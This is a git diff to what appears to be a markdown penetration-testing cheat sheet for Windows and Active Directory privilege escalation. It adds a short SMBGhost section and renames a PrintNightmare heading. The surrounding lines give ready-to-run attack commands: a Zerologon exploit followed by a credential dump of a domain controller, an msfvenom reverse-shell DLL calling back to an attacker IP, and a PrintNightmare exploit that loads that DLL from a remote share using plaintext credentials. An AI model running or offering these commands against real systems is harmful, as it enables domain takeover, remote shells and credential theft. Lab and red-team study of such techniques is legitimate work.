@@ -326,7 +326,7 @@ Exploit:
 python3 cve-2020-1472-exploit.py Monteverde(dc-name) 10.10.10.172(dc-ip)
 impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
 ```
-### Windows Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
+### Windows Print Spooler Service Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
 ```
 Detect:
 nxc smb ip -u username -p pass -M printnightmare
@@ -335,6 +335,16 @@ nxc smb ip -u username -p pass -M printnightmare
 impacket-smbserver test . -smb2support
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
 python3 printnightmare.py -dll '\\10.21.176.25\test\backupscript.dll' 'svc-admin:management2005@10.10.211.60'
+```
+### Windows SMBv3 Privilege Escalation By SMBGhost CVE-2020-0796
+>A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'.
+```
+Detect:
+nxc smb ip -u user -p pwd -M smbghost
+```
+```
+Exploit:
+run the executable file
 ```
 ### Domain Priviledge Escalation By NoPac CVE-2021-42278 & CVE-2021-42287
 ```
